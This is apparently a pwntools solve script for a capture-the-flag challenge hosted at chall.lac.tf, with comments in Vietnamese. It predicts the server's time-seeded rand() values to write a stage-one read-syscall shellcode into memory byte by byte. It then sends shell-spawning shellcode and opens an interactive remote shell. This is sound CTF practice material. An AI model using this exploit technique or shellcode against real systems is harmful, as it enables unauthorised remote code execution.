from pwn import *
import ctypes
import time

context.arch = 'amd64'
# Thay đổi thông tin server tại đây
host = 'chall.lac.tf' 
port = 31338

def attempt_exploit(offset):
    try:
        # Mỗi lần thử tạo một kết nối mới
        p = remote(host, port)
        libc = ctypes.CDLL("./libc.so.6")

        stage1 = [
            0x6a, 0x00,
            0x5f,
            0xbe, 0x0e, 0x00, 0x37, 0x13,
            0xb2, 0xff,
            0x31, 0xc0,
            0x0f, 0x05
        ]

        # Đồng bộ seed với offset
        seed = int(time.time()) + offset
        libc.srand(seed)

        # Bỏ qua 14 byte khởi tạo
        for _ in range(14):
            libc.rand()

        log.info(f"Thử exploit với offset: {offset} (Seed: {seed})")

        for i in range(len(stage1)):
            target = stage1[i]
            current_val = -1
            while current_val != target:
                p.sendlineafter(b'> ', b'1')
                p.sendlineafter(b': ', str(i).encode())
                current_val = libc.rand() & 0xFF
        
        p.sendlineafter(b'> ', b'2')
        
        # Kiểm tra xem stage1 có chạy thành công không bằng cách gửi shellcode
        time.sleep(0.5)
        p.send(asm(shellcraft.sh()))
        
        # Gửi một lệnh kiểm tra shell
        p.sendline(b'echo Pwned')
        output = p.recvuntil(b'Pwned', timeout=2)
        
        if b'Pwned' in output:
            log.success(f"Tìm thấy offset chính xác: {offset}")
            p.interactive()
            return True
        
        p.close()
        return False

    except Exception:
        if 'p' in locals(): p.close()
        return False

# Thử các offset từ -5 đến 5 giây để tìm đúng thời gian của server
for offset in range(-5, 6):
    if attempt_exploit(offset):
        break